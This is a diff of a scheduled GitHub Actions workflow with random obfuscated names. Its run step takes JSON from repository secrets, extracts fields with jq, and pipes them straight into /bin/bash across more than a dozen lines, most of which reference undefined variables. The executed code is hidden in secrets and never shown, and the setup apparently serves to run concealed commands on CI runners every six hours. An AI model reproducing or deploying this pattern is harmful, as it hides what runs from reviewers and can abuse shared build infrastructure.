@@ -3,39 +3,28 @@ name: tengtexie6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 0/6 * * *'
-jobs:  # 18620
+    - cron: '42 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tengtexie6789
         env:
-          nkp2: ${{ secrets.nkp2 }}
+          h02: ${{ secrets.h02 }}
         run: |
-          echo $nkp2 | jq -r .d3909 | /bin/bash
-          echo $feyej63 | jq -r .y8739 | /bin/bash
-          echo $hbc0 | jq -r .s418 | /bin/bash
-          echo $kj0201 | jq -r .ppvzb3 | /bin/bash
-          echo $ipunl11 | jq -r .bekk34609 | /bin/bash
-          echo $vvxd18820 | jq -r .vytc88249 | /bin/bash
-          echo $dr020 | jq -r .n76424 | /bin/bash
-          echo $lic47 | jq -r .gt46057 | /bin/bash
-          echo $ln8069 | jq -r .dpov12 | /bin/bash
-          echo $cx7 | jq -r .qz72 | /bin/bash
-          echo $hz058 | jq -r .qkpik72656 | /bin/bash
-          echo $yj337 | jq -r .dlxj182 | /bin/bash
-          echo $mkci634 | jq -r .cd933 | /bin/bash
-          echo $d21 | jq -r .ega801 | /bin/bash
-          echo $jc34 | jq -r .vzts00 | /bin/bash
-          echo $hu5270 | jq -r .ipskh4 | /bin/bash
-          echo $t0990 | jq -r .gw8 | /bin/bash
-          echo $z62 | jq -r .k7 | /bin/bash
-          echo $fraix8239 | jq -r .ak32 | /bin/bash
-          echo $jz40 | jq -r .des604 | /bin/bash
-          echo $i871 | jq -r .y185 | /bin/bash
-          echo $u8218 | jq -r .cyw614 | /bin/bash
-          echo $tpbwd17674 | jq -r .ihlfr0 | /bin/bash
-          echo $h45 | jq -r .m47 | /bin/bash
+          echo $h02 | jq -r .uopw1 | /bin/bash
+          echo $pif5203 | jq -r .rplf20 | /bin/bash
+          echo $ozps5929 | jq -r .ny31 | /bin/bash
+          echo $noy0 | jq -r .pwkk823 | /bin/bash
+          echo $c6 | jq -r .uzx1 | /bin/bash
+          echo $lafph53882 | jq -r .p6 | /bin/bash
+          echo $ol4608 | jq -r .dgx0 | /bin/bash
+          echo $qh70220 | jq -r .ib13136 | /bin/bash
+          echo $vrtn41 | jq -r .sfy4 | /bin/bash
+          echo $cy60 | jq -r .uizk57 | /bin/bash
+          echo $mnwi1618 | jq -r .m958 | /bin/bash
+          echo $wlok420 | jq -r .muqn2687 | /bin/bash
+          echo $o78 | jq -r .n749 | /bin/bash
+          echo $uzr8728 | jq -r .d515 | /bin/bash
 
